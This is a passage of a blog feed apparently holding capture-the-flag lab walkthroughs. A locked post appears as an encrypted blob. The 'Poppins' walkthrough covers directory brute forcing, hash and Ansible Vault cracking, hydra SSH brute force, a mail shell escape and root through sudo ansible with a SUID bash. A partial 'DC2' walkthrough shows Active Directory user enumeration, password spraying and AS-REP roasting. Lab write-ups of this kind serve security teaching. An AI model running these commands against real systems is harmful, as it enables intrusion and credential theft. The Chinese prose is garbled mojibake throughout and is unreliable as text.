lcXSEpSTDtJBUNIAlwFHwRf6L2e6ZKL5o+I5pWL5YaTTAYLFhfovJ3pk4/mj5DmlZblhotURFALBj1OQQcITlQIV1xdFxFdFB4DVUxUWVZQB1ASCF0bA11UVBBSXRQDF1VMS1BdWx4WSw8RBR5PXXh6E0sQV18cBkgcGFQWOxcMHR0cXXh1VghUTxNUSAZTXFFFUlB/DxEFHk9deHoTSxBXDkxLW1wYVl07FwwdHRxdeHVWCFRPE18JTxhOUVpSHhAZE0cHV19nVRNSHhgANxhdSk5eEVRaDh8GDVFfFl0BXhtnEgkGTU9ddz9QDwhKFkRZHBhUE0VVQhUcCBdUV1AtUxQOGx0bZ0tdRQRYFghfCwRWXlFQXFsGAh5iEDIYGBEDRBoZSxsETUpbUi1dGgovGApMUB5GB14BVkpITUlNV0NJHgEAAEcbWUtLQBYXBBgfHFAUMhgXVEAAAgRTCVlbU0ICbhEIAxxNSU1XQ0kLVUsBHQRMAxdfHVwQQhIJBk1PXRgTHlMcBQcfAxQyF1IXBBgfHFBKTVZoE0IqGAMNGR5JTVgGCk9NVhkeV0wDRR1eAUsBHQRMAzJKeFMUAAUfDnh1WU0XCwtCEUxLVFYYGgFXVUIVHAgXSFlEAUYRTQAJGEtPXBlAAUdYQFFbDAgAB0MFTEMSCQAyBBdUHVUQU0xHG0pdBj1OQUvlvL7mnb3li4novrvoobTml47vvLTkvK3lsbTmgYfmhbrnm6kACRhLT1zmlrDkuoTlhrTlr4zlh7TlhJXliZhXW1dcUkweEBkTRxtZS0tAFg1aDh8MDgbvvLTku7bogLvlianlu4vlkbvploXnlZjmiZ/jgakEF0gJeA0dXlABDwUfDBrlibXmjZPliYUfHwcf5p276ZmoHwlGH1XliarmjJLliZgZV1dM5p206ZiiDVoFQ1ZhBEgG55uD5o+X55mK5bygD+WxgeWkleS7re+8tOWvvueguQsRXhEITgkJW1xdURUNWg4fDA4GBBdHTDtJHQINVQRbV1MXERYBERsYBR9UVhxWAAwXDUZLUF1bHhZVAREGDAUfS18XXRlKTgoKVU1PUjJ8FBcVUhUXWRwXAURVD3o4CktLT1gAVU9NehoEV0x4ehNLEFdfAARVXRdVE1wAGhVHChsYUVN4RBwJTVhDSldXQ1sREgQUVVsQSldYBhhVCgIHHkhLBQdaQxoCBEFhBBdbWBZUS1FfGBldBjILGgBVBBRVTOWFleiOj+WPrlEeUBJKTuWEheOBquiOj+WPrn5bE1ZJQhhZVTIESEUXD0kOHwwOGFtUVgFCSEocCQVfTVlQFxwGBRUEBx8YVFYcVkhKAwAOVFQfCQBeGhkwJQpCXQIYGl4YCF8KClVNT1JdUFZNEwkfGBdKWB1FWh8fBx8WTEBDUh4GHwZHH15MSBgHQhAfXhwTTDJeWxNWDh8fBx8VDgkOR1MRVRFRDw8NDVZGABBZSVtfDAhZD0IFE1lGDF9FMl5bE1YOGAMNGRUMXQBLUBNUFFEJDAsMAUYDR1URDVoJCAgPQQgUX0VfXkUyTUQXQxsMHQ1RWllVQgVUfwMVDQ8CWkpCBlQTAgILDjIEF1QdVRBTTEcbSl0GPU5BS0seChhIAwQYAg9/UV8KBFxBBj1OHh0ZHQRV--&gt;
&lt;!--/encrypt--&gt;sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/%F0%9F%94%92-nei-bu-_Maze.html</guid><pubDate>Thu, 04 Sep 2025 12:24:03 +0000</pubDate></item><item><title>ÂÜÖÈÉ®_Poppins</title><link>https://7r1UMPHK.github.io/post/nei-bu-_Poppins.html</link><description># ‰∏Ä„ÄÅ‰ø°ÊÅØÊî∂ÈõÜ 

‰ΩøÁî® arp-scan Êâ´ÊèèÂ±ÄÂüüÁΩë‰∏≠ÁöÑ‰∏ªÊú∫Ôºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ sudo arp-scan -l
...
192.168.205.143 08:00:27:77:42:bb       PCS Systemtechnik GmbH
...
```

ÂèëÁé∞ÁõÆÊ†á‰∏ªÊú∫Ôºö`192.168.205.143`

## Á´ØÂè£Êâ´Êèè

ÂØπÁõÆÊ†á‰∏ªÊú∫ËøõË°åÂÖ®Á´ØÂè£Êâ´ÊèèÔºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ nmap -p0-65535 192.168.205.143
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-02 15:20 EDT
Nmap scan report for 192.168.205.143
Host is up (0.000089s latency).
Not shown: 65532 closed tcp ports (reset)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
110/tcp open  pop3
995/tcp open  pop3s
```

ÂèëÁé∞Âõõ‰∏™ÂºÄÊîæÁ´ØÂè£Ôºö

- **22/tcp**: SSHÊúçÂä°
- **80/tcp**: HTTPÊúçÂä°
- **110/tcp**: POP3ÊúçÂä°
- **995/tcp**: POP3SÊúçÂä°

# ‰∫å„ÄÅWebÊúçÂä°Êé¢Êµã

ËÆøÈóÆ80Á´ØÂè£ÂèëÁé∞ÊòØ‰∏Ä‰∏™ÁîµÂΩ±‰ªãÁªçÈ°µÈù¢ÔºåÂåÖÂê´‰∏Ä‰∫õ‰∫∫Âêç‰ø°ÊÅØ„ÄÇ

## ÁõÆÂΩïÊûö‰∏æ

‰ΩøÁî® dirsearch ËøõË°åÁõÆÂΩïÊâ´ÊèèÔºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ dirsearch -u 192.168.205.143        
...
[15:23:04] 301 -  314B  - /s  -&gt;  http://192.168.205.143/s/
...
```

ÂèëÁé∞ `/s` ÁõÆÂΩïÔºåÁªßÁª≠Ê∑±ÂÖ•Êé¢Êµã„ÄÇ

## Ê∑±Â∫¶ÁõÆÂΩïÁàÜÁ†¥ÁöÑÊÄùË∑Ø

ËøôÈáåÊúâ‰∏™ÂÖ≥ÈîÆÁöÑÊÄùË∑ØËΩ¨Êç¢ÔºöÂΩìÂèëÁé∞Âè™Êúâ‰∏Ä‰∏™ `/s` ÁõÆÂΩïÊó∂ÔºåÊàëÊÉ≥Âà∞ËøôÂèØËÉΩ‰∏çÊòØÊôÆÈÄöÁöÑÁõÆÂΩïÁªìÊûÑ„ÄÇÁªìÂêàËøôÊòØSublargeÂá∫ÁöÑÈù∂Êú∫ÔºåÊàëËÆ∞Âæó‰πãÂâçÂÅöËøáÁ±ª‰ººÁöÑÈ¢òÁõÆÔºåÊúâ‰∫õÈù∂Êú∫‰ºöÊääSSHÁßÅÈí•ÊàñÈáçË¶ÅÊñá‰ª∂ËóèÂú®ÂæàÊ∑±ÁöÑÁõÆÂΩïË∑ØÂæÑ‰∏≠„ÄÇ

Êó¢ÁÑ∂Âè™ÂèëÁé∞‰∫ÜÂ≠óÊØç `s`ÔºåÈÇ£ÂæàÂèØËÉΩÊòØÊåâÂ≠óÊØçÈÄêÂ±ÇÊûÑÂª∫ÁöÑÊ∑±Â±ÇÁõÆÂΩï„ÄÇ‰∫éÊòØÊàëÂÜ≥ÂÆöÁî®ÂçïÂ≠óÊØç‰Ωú‰∏∫Â≠óÂÖ∏ËøõË°åÈÄíÂΩíÁàÜÁ†¥Ôºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ printf '%s\n' {a..z} &gt; a.txt                                       
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ printf '%s\n' {A..Z} &gt;&gt; a.txt
```

ÂàõÂª∫ÂåÖÂê´ÊâÄÊúâÂ§ßÂ∞èÂÜôÂ≠óÊØçÁöÑÂ≠óÂÖ∏Êñá‰ª∂ÔºåÁÑ∂Âêé‰ΩøÁî® feroxbuster ËøõË°åÊ∑±Â∫¶ÈÄíÂΩíÊâ´ÊèèÔºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ feroxbuster --url http://192.168.205.143 -w a.txt -t 64 --depth 99999
...
301      GET        9l       28w      314c http://192.168.205.143/s =&gt; http://192.168.205.143/s/
301      GET        9l       28w      316c http://192.168.205.143/s/u =&gt; http://192.168.205.143/s/u/
301      GET        9l       28w      318c http://192.168.205.143/s/u/p =&gt; http://192.168.205.143/s/u/p/
...
301      GET        9l       28w      380c http://192.168.205.143/s/u/p/e/r/c/a/l/i/f/r/a/g/i/l/i/s/t/i/c/e/x/p/i/a/l/i/d/o/c/i/o/u/s/ =&gt; 
...
```

**ÂÖ≥ÈîÆÊ¥ûÂØü**ÔºöËøôÈáåËÆæÁΩÆ `--depth 99999` ÊòØ‰∏∫‰∫ÜËÆ©Â∑•ÂÖ∑Êó†ÈôêÈÄíÂΩíÔºåÁõ¥Âà∞Êâæ‰∏çÂà∞Êõ¥Â§öÁõÆÂΩï‰∏∫Ê≠¢„ÄÇÈöèÁùÄÊâ´ÊèèÁöÑËøõË°åÔºåÂèØ‰ª•ÁúãÂà∞Ë∑ØÂæÑË∂äÊù•Ë∂äÈïøÔºåÊúÄÁªàÊè≠Á§∫‰∫ÜÂÆåÊï¥ÁöÑÂçïËØçÔºö

`s/u/p/e/r/c/a/l/i/f/r/a/g/i/l/i/s/t/i/c/e/x/p/i/a/l/i/d/o/c/i/o/u/s`

Ëøô‰∏™Ë∑ØÂæÑÂÆûÈôÖ‰∏äÊòØÂçïËØç **'supercalifragilisticexpialidocious'** ÁöÑÂ≠óÊØçÂàÜËß£ÔºåËøôÊòØÁîµÂΩ±„ÄäÊ¨¢‰πêÊª°‰∫∫Èó¥„Äã(Mary Poppins)‰∏≠ÁöÑÁªèÂÖ∏ÂçïËØçÔºå‰∏éÈù∂Êú∫ÂêçÁß∞'Poppins'ÂëºÂ∫î„ÄÇ

Âú®ËØ•Ë∂ÖÈïøÁõÆÂΩï‰∏ãÁªßÁª≠Êâ´ÊèèÔºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ gobuster dir -u http://192.168.205.143/s/u/p/e/r/c/a/l/i/f/r/a/g/i/l/i/s/t/i/c/e/x/p/i/a/l/i/d/o/c/i/o/u/s/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html,zip,db,bak -t 64 
...
/index.html           (Status: 200) [Size: 1531]
/hash.bak             (Status: 200) [Size: 3300]
```

ÊûúÁÑ∂ÂèëÁé∞‰∫ÜÂÖ≥ÈîÆÊñá‰ª∂ `hash.bak`„ÄÇ

# ‰∏â„ÄÅÂìàÂ∏åÁ†¥Ëß£

‰∏ãËΩΩÂπ∂ÂàÜÊûê hash.bak Êñá‰ª∂Ôºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ curl http://192.168.205.143/s/u/p/e/r/c/a/l/i/f/r/a/g/i/l/i/s/t/i/c/e/x/p/i/a/l/i/d/o/c/i/o/u/s/hash.bak
fcb6cc0d2a780ac022cf70ceb0d85f4c
c63c3575b62f4944fba4879c2dd3951b
...
```

Êñá‰ª∂ÂåÖÂê´100‰∏™MD5ÂìàÂ∏åÂÄº„ÄÇ‰ΩøÁî®johnËøõË°åÁ†¥Ëß£Ôºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ john --wordlist=/usr/share/wordlists/rockyou.txt hash --format=Raw-MD5     
...
kent12           (?)   
amotejoel        (?)   
sunjoo           (?)   
...
```

ÊèêÂèñÁ†¥Ëß£ÊàêÂäüÁöÑÂØÜÁ†ÅÔºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ john --show hash --format=Raw-MD5 | cut -d: -f2 | sort | uniq &gt; pass
```

# Âõõ„ÄÅÁî®Êà∑ÂêçÊî∂ÈõÜ‰∏éSSHÁàÜÁ†¥

## Áî®Êà∑ÂêçÊûö‰∏æ

‰ΩøÁî® cewl ‰ªé‰∏ªÈ°µÊèêÂèñÂèØËÉΩÁöÑÁî®Êà∑ÂêçÔºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ cewl http://192.168.205.143/ | tr 'A-Z' 'a-z' &gt; user
```

ÈÄöËøáSSHËøûÊé•ÊµãËØïÔºåÂèëÁé∞Á≥ªÁªüÁöÑË°å‰∏∫ÁâπÁÇπÔºö

- Â≠òÂú®ÁöÑÁî®Êà∑‰ºöÊèêÁ§∫ËæìÂÖ•ÂØÜÁ†Å
- ‰∏çÂ≠òÂú®ÁöÑÁî®Êà∑Áõ¥Êé•ËøîÂõû 'Permission denied (publickey)'

Âà©Áî®Ê≠§ÁâπÁÇπÊûö‰∏æÊúâÊïàÁî®Êà∑Ôºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ while read u; do timeout 3 ssh '$u@192.168.205.143' 2&gt;&amp;1 | grep -q 'publickey' || echo '$u'; done &lt; user
jane
bert
```

ÂèëÁé∞‰∏â‰∏™ÊúâÊïàÁî®Êà∑Ôºöjane„ÄÅbert„ÄÅroot

## SSHÂØÜÁ†ÅÁàÜÁ†¥

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ echo -e 'jane\nbert\nroot' &gt; user                                                       
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ hydra -L user -P pass ssh://192.168.205.143 -I -u -e nsr -t 64
...
[22][ssh] host: 192.168.205.143   login: bert   password: jmac92777
```

ÊàêÂäüËé∑ÂæóbertÁî®Êà∑ÁöÑÂá≠ÊçÆÔºö`bert:jmac92777`

# ‰∫î„ÄÅÂàùÂßãËÆøÈóÆ‰∏éÈÇÆ‰ª∂ÂàÜÊûê

Â∞ùËØïSSHÁôªÂΩïbertÁî®Êà∑Ôºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ ssh bert@192.168.205.143          
bert@192.168.205.143's password: 
...
You have mail.
This account is currently not available.
Connection to 192.168.205.143 closed.
```

ËôΩÁÑ∂SSH‰ºöËØùË¢´Á´ãÂç≥ÂÖ≥Èó≠Ôºå‰ΩÜÊèêÁ§∫ÊòæÁ§∫ÊúâÈÇÆ‰ª∂„ÄÇ‰ΩøÁî®POP3ÂçèËÆÆÊü•ÁúãÈÇÆ‰ª∂Ôºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ nc 192.168.205.143 110
+OK Dovecot (Debian) ready.
User bert
+OK
Pass jmac92777
+OK Logged in.
STAT
+OK 1 1517
retr 1
+OK 1517 octets
```

ÈÇÆ‰ª∂ÂÜÖÂÆπÊòæÁ§∫JaneÂèëÈÄÅÁªôBertÁöÑÈáçË¶Å‰ø°ÊÅØÔºö

```
Subject: Urgent: Prod Server Credentials for Ansible Playbook
From: jane@poppins
To: bert@poppins

Hi Bert,

I've just finished the new Ansible playbook for the a-27 software deployment on our main production server, `web01.poppins.dsz`. It's ready to go.

The playbook contains some sensitive API keys, so I've encrypted the variables using Ansible Vault. You'll need to use the `ansible-vault decrypt` command to run it.

Here is the vault string you'll need to paste into the `secrets.yml` file.

$ANSIBLE_VAULT;1.1;AES256
66626631636362303332633238373338386634373434646532656534323230333938303331663630
3236333934663930343263363831353138323630393134320a366366393939373636386538336336
34353536656637313762323832643339633234656635326137633439303730373335386536306436
6335363366376634630a326563623737626337353436323565643365333061663661396337613731
3730
```

# ÂÖ≠„ÄÅAnsible VaultÁ†¥Ëß£

## ÊèêÂèñÂπ∂Á†¥Ëß£VaultÂØÜÁ†Å

Â∞ÜVaultÂÜÖÂÆπ‰øùÂ≠òÂà∞Êñá‰ª∂Âπ∂‰ΩøÁî®johnÁ†¥Ëß£Ôºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ ansible2john secrets.yml &gt; hash                                                
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ john --wordlist=/usr/share/wordlists/rockyou.txt hash                             
...
javiel           (secrets.yml)   
```

‰ΩøÁî®Á†¥Ëß£ÁöÑÂØÜÁ†ÅËß£ÂØÜVaultÔºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ ansible-vault view secrets.yml                                                 
Vault password: javiel
cumibug
```

Ëé∑Âæó‰∏§‰∏™ÂÖ≥ÈîÆ‰ø°ÊÅØÔºö

- VaultÂØÜÁ†ÅÔºö`javiel`
- Ëß£ÂØÜÂêéÁöÑÂØÜÁ†ÅÔºö`cumibug`

# ‰∏É„ÄÅÊùÉÈôêÊèêÂçá

## Ëé∑ÂæóJaneÁî®Êà∑ÊùÉÈôê

Â∞ùËØï‰ΩøÁî®Ëß£ÂØÜÁöÑVaultÂØÜÁ†Å‰Ωú‰∏∫JaneÁöÑÂØÜÁ†ÅÔºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ ssh jane@192.168.205.143
jane@192.168.205.143's password: javiel
...
jane@Poppins:~$ id
uid=1001(jane) gid=1001(jane) groups=1001(jane)
```

## ÂàáÊç¢Âà∞MichaelÁî®Êà∑

‰ΩøÁî®Vault‰∏≠ÁöÑÂØÜÁ†ÅÂàáÊç¢Âà∞michaelÁî®Êà∑Ôºö

```bash
jane@Poppins:/home$ su michael
Password: cumibug
michael@Poppins:/home$ sudo -l
...
User michael may run the following commands on Poppins:
    (winifred) PASSWD: /usr/bin/mail *
```

MichaelÂèØ‰ª•‰ª•winifredÁî®Êà∑Ë∫´‰ªΩËøêË°åmailÂëΩ‰ª§„ÄÇ

## Âà©Áî®mailÂëΩ‰ª§ÊèêÂçáÂà∞Winifred

ÂèÇËÄÉGTFObinsÔºåmailÂëΩ‰ª§ÂèØ‰ª•ÈÄöËøá‰∫§‰∫íÂºèshellÈÄÉÈÄ∏Ôºå‰ΩÜÊòØÂõ†‰∏∫ÂÆÉËøô‰∏™mailÂëΩ‰ª§ÁâàÊú¨Â§™‰ΩéÔºàÂ∫îËØ•ÊòØÂêßÔºâÁöÑÂéüÂõ†ÔºåÊó†Ê≥ïÁõ¥Êé•‰ΩøÁî®`--exec`ÂèÇÊï∞ÔºåÊàë‰ª¨Âè™ÂèØ‰ª•ÁªôËá™Â∑±ÂèëÈÄÅ‰∏Ä‰∏™ÈÇÆ‰ª∂ÔºåËøõÂà∞mail‰∫§‰∫íÈÄöËøá‰∫§‰∫íÂºèshellÈÄÉÈÄ∏Ôºö

```bash
michael@Poppins:/home$ sudo -u winifred /usr/bin/mail -s 'test' winifred &lt; /dev/null
Null message body; hope that's ok
michael@Poppins:/home$ sudo -u winifred /usr/bin/mail
Mail version 8.1.2 01/15/2001.  Type ? for help.
'/var/mail/winifred': 1 message 1 new
&gt;N  1 winifred@poppins   Tue Sep 02 09:41   18/558   test
&amp; !/bin/bash
```

ÊàêÂäüËé∑ÂæówinifredÁî®Êà∑ÊùÉÈôêÔºö

```bash
winifred@Poppins:/home$ sudo -l
...
User winifred may run the following commands on Poppins:
    (ALL) NOPASSWD: /usr/bin/ansible *
```

## Âà©Áî®AnsibleËé∑ÂæóRootÊùÉÈôê

WinifredÂèØ‰ª•Êó†ÂØÜÁ†ÅËøêË°åansibleÂëΩ‰ª§„ÄÇAnsibleÁöÑshellÊ®°ÂùóÂèØ‰ª•ÊâßË°å‰ªªÊÑèÂëΩ‰ª§Ôºö

```bash
winifred@Poppins:/home$ sudo /usr/bin/ansible localhost -m shell -a 'id' 
[WARNING]: No inventory was parsed, only implicit localhost is available
localhost | CHANGED | rc=0 &gt;&gt;
uid=0(root) gid=0(root) groups=0(root)
```

‰∏∫bashËÆæÁΩÆSUID‰Ωç‰ª•Ëé∑ÂæóÊåÅ‰πÖÁöÑrootÊùÉÈôêÔºö

```bash
winifred@Poppins:/home$ sudo /usr/bin/ansible localhost -m shell -a 'chmod +s /bin/bash' 
...
winifred@Poppins:/home$ ls -al /bin/bash
-rwsr-sr-x 1 root root 1168776 Apr 18  2019 /bin/bash
winifred@Poppins:/home$ bash -p
bash-5.0# id
uid=1003(winifred) gid=1003(winifred) euid=0(root) egid=0(root) groups=0(root),1003(winifred)
```

# ÂÖ´„ÄÅËé∑Âèñflag

```bash
bash-5.0# cat /root/root.txt /var/mail/user.txt 
flag{root-bdabe071bed8018ba8e15d795d281843}
flag{user-b1d2367529a9edd2a6f9c95168bce12ei}
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_Poppins.html</guid><pubDate>Thu, 04 Sep 2025 06:25:43 +0000</pubDate></item><item><title>hmv_DC2</title><link>https://7r1UMPHK.github.io/post/hmv_DC2.html</link><description># ‰∏Ä„ÄÅ‰ø°ÊÅØÊî∂ÈõÜ

## ‰∏ªÊú∫ÂèëÁé∞

‰ΩøÁî®arp-scanÊâ´ÊèèÊú¨Âú∞ÁΩëÊÆµÔºåÂèëÁé∞ÁõÆÊ†á‰∏ªÊú∫Ôºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ sudo arp-scan -l
...
192.168.205.146 08:00:27:ae:b5:53       PCS Systemtechnik GmbH
...
```

Á°ÆÂÆöÁõÆÊ†áIPÔºö`192.168.205.146`

## Á´ØÂè£Êâ´Êèè

‰ΩøÁî®rustscanÂØπÁõÆÊ†áËøõË°åÂÖ®Á´ØÂè£Êâ´ÊèèÔºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ rustscan -a 192.168.205.146
...
Open 192.168.205.146:53
Open 192.168.205.146:88
Open 192.168.205.146:135
Open 192.168.205.146:139
Open 192.168.205.146:389
Open 192.168.205.146:445
Open 192.168.205.146:464
Open 192.168.205.146:593
Open 192.168.205.146:636
Open 192.168.205.146:3268
Open 192.168.205.146:3269
Open 192.168.205.146:5985
Open 192.168.205.146:9389
```

‰ªéÂºÄÊîæÁ´ØÂè£ÂèØ‰ª•Âà§Êñ≠ËøôÊòØ‰∏ÄÂè∞WindowsÂüüÊéßÂà∂Âô®ÔºåÂÖ≥ÈîÆÊúçÂä°ÂåÖÊã¨Ôºö

- 53: DNSÊúçÂä°
- 88: KerberosËÆ§ËØÅÊúçÂä°
- 389/636: LDAP/LDAPS
- 445: SMBÊúçÂä°
- 5985: WinRMÊúçÂä°

## SMB‰ø°ÊÅØÊî∂ÈõÜ

‰ΩøÁî®enum4linux-ngËøõË°åSMBÊûö‰∏æÔºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ enum4linux-ng -A 192.168.205.146
...
[+] Long domain name is: SOUPEDECODE.LOCAL
[+] Got domain/workgroup name: SOUPEDECODE
[+] Full NetBIOS names information:
- DC01            &lt;00&gt; -         M &lt;ACTIVE&gt;  Workstation Service
- SOUPEDECODE     &lt;1c&gt; - &lt;GROUP&gt; M &lt;ACTIVE&gt;  Domain Controllers
...
```

Ëé∑ÂèñÈáçË¶Å‰ø°ÊÅØÔºö

- ÂüüÂêçÔºö`SOUPEDECODE.LOCAL`
- ÂüüÊéßÂà∂Âô®‰∏ªÊú∫ÂêçÔºö`DC01`
- FQDNÔºö`DC01.SOUPEDECODE.LOCAL`
- Êó†ÂåøÂêçÁôªÂΩï

Â∞ÜÂüüÂêçÊ∑ªÂä†Âà∞hostsÊñá‰ª∂Ôºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ echo '192.168.205.146 SOUPEDECODE.LOCAL' &gt;&gt; /etc/hosts
```

## ÊºèÊ¥ûÊâ´Êèè

‰ΩøÁî®nmapÊºèÊ¥ûÊâ´ÊèèËÑöÊú¨Ê£ÄÊµãSMBÁõ∏ÂÖ≥ÊºèÊ¥ûÔºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ nmap --script=vuln -p445,139 192.168.205.146 
...
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
...
```

Êú™ÂèëÁé∞ÂèØÂà©Áî®ÁöÑSMBÊºèÊ¥û„ÄÇ

## LDAP‰ø°ÊÅØÊî∂ÈõÜ

Â∞ùËØïÂåøÂêçÁªëÂÆöLDAPÊúçÂä°Ôºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ ldapsearch -H ldap://192.168.205.146 -x -b 'dc=soupedecode,dc=local'
...
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090A58, comment: In order to perform this operation a successful bind must be completed on the connection.
...
```

LDAPÊúçÂä°ÊãíÁªùÂåøÂêçÊü•ËØ¢ÔºåÈúÄË¶ÅÊúâÊïàÂá≠ÊçÆ„ÄÇ

# ‰∫å„ÄÅÁî®Êà∑Êûö‰∏æ

‰ΩøÁî®kerbruteÂ∑•ÂÖ∑Êûö‰∏æÂüüÁî®Êà∑Ôºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ kerbrute userenum --dc 192.168.205.146 -d soupedecode.local /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -t 64
...
2025/09/03 13:39:39 &gt;  [+] VALID USERNAME:       admin@soupedecode.local
2025/09/03 13:39:39 &gt;  [+] VALID USERNAME:       charlie@soupedecode.local
2025/09/03 13:39:39 &gt;  [+] VALID USERNAME:       administrator@soupedecode.local
...
```

ÂèëÁé∞ÊúâÊïàÁî®Êà∑ÂêçÔºö

- admin
- charlie
- administrator

# ‰∏â„ÄÅÂØÜÁ†ÅÁàÜÁ†¥

## SMBÂØÜÁ†ÅÁàÜÁ†¥

‰ΩøÁî®crackmapexecÂØπÂèëÁé∞ÁöÑÁî®Êà∑ËøõË°åÂØÜÁ†ÅÂñ∑Ê¥íÊîªÂáªÔºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ crackmapexec smb 192.168.205.146 -u user -p user --continue-on-success| grep '+'
SMB                      192.168.205.146 445    DC01             [+] SOUPEDECODE.LOCAL\charlie:charlie 
```

ÊàêÂäüËé∑Âæó‰∏ÄÁªÑÊúâÊïàÂá≠ÊçÆÔºö`charlie:charlie`

## È™åËØÅÊùÉÈôê

‰ΩøÁî®Ëé∑ÂæóÁöÑÂá≠ÊçÆÊü•ÁúãSMBÂÖ±‰∫´ÊùÉÈôêÔºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ nxc smb 192.168.205.146 -u charlie -p charlie --shares
...
SMB         192.168.205.146 445    DC01             Share           Permissions     Remark
SMB         192.168.205.146 445    DC01             -----           -----------     ------
SMB         192.168.205.146 445    DC01             ADMIN$                          Remote Admin
SMB         192.168.205.146 445    DC01             C$                              Default share
SMB         192.168.205.146 445    DC01             IPC$            READ            Remote IPC
SMB         192.168.205.146 445    DC01             NETLOGON        READ            Logon server share 
SMB         192.168.205.146 445    DC01             SYSVOL          READ            Logon server share
```

charlieÁî®Êà∑Âè™ÊúâÊ†áÂáÜÁöÑÂüüÁî®Êà∑ÊùÉÈôêÔºåÊó†Ê≥ïËÆøÈóÆÊïèÊÑüÂÖ±‰∫´„ÄÇ

# Âõõ„ÄÅÂüüÁî®Êà∑Ëøõ‰∏ÄÊ≠•Êûö‰∏æ

## RIDÁàÜÁ†¥

‰ΩøÁî®charlieÁî®Êà∑ÁöÑÂá≠ÊçÆËøõË°åRIDÁàÜÁ†¥ÔºåËé∑ÂèñÊõ¥Â§öÁî®Êà∑‰ø°ÊÅØÔºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ nxc smb 192.168.205.146 -u charlie -p charlie --rid-brute|awk -F '\' '{print $2}'|awk '{print $1}' &gt; user
```

## KerberoastingÊîªÂáª

‰ΩøÁî®GetNPUsersÂ∑•ÂÖ∑Ê£ÄÊü•ÊòØÂê¶ÊúâÁî®Êà∑ËÆæÁΩÆ‰∫Ü'‰∏çË¶ÅÊ±ÇKerberosÈ¢ÑËÆ§ËØÅ'Â±ûÊÄßÔºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ impacket-GetNPUsers -usersfile user -dc-ip 192.168.205.146 'SOUPEDECODE.LOCAL/charlie:charlie' |grep -v '-'

